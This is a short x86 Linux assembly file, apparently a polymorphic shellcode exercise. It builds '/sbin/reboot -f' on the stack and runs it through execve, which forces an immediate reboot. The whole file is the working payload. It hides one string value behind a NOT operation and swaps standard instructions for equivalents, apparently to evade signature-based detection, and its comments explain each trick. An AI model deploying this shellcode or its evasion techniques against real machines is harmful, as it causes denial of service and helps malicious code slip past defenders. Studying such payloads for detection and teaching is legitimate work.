;Author:   evoche
;License:  GPL

global _start

section .text
	
;use this as the program entry point
_start:

	xor eax,eax
	push eax

	;push dword 0x746f6f62
	mov dword [esp-4], 0x746f6f62		;from the notes
	sub esp, 4

	;push dword 0x65722f6e				
	mov esi, 0x9A8DD091					;NOT esi to get required value and push to stack
	not esi
	push esi

	push dword 0x6962732f
	mov ebx,esp
	push eax
	push word 0x662d
	
	cld									;useless instruction - clear direction flag
	mov esi,esp

	push eax
	push esi
	push ebx

	;mov ecx,esp
	xchg ecx,esp						;slightly different way of getting data to ecx

	;mov al,0xb
	inc al								;longer of way of putting 11 into eax	
	mov dl, 0xb
	mul dl	
	cdq									;clean up edx				
	int 0x80

